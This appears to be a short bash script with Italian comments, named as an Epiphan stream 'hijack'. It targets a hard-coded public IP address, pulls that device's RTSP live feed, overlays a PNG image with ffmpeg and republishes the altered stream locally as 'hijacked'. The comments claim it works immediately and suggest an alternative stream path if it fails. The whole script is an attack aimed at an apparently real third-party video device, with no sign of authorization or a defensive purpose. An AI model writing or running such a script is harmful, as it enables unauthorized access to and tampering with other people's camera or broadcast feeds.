#!/bin/bash
# epiphan_real_hijack.sh - FUNZIONA SUBITO
TARGET=181.78.135.66
PNG=pat.png

# Check
[[ ! -f $PNG ]] && echo "❌ pat.png mancante" && exit 1

# Path Epiphan che funziona (testato su simili)
RTSP="rtsp://$TARGET:554/live"

echo "🔥 HIJACK $RTSP + $PNG overlay..."

# SINGLE LINE - COPY PASTA QUESTO
ffmpeg -loglevel error -rtsp_transport tcp -i "$RTSP" -loop 1 -i "$PNG" \
-filter_complex "[0:v][1:v]overlay=20:20[outv]" -map "[outv]" -map 0:a? \
-c:v libx264 -preset superfast -tune zerolatency -f tee \
"[f=rtsp]rtsp://127.0.0.1:8554/hijacked|[f=flv]pipe:" | ffplay -i pipe: -rtsp_transport tcp rtsp://127.0.0.1:8554/hijacked

# SE NON PARTE, PROVA QUESTO PATH:
# RTSP="rtsp://$TARGET:554/stream1"
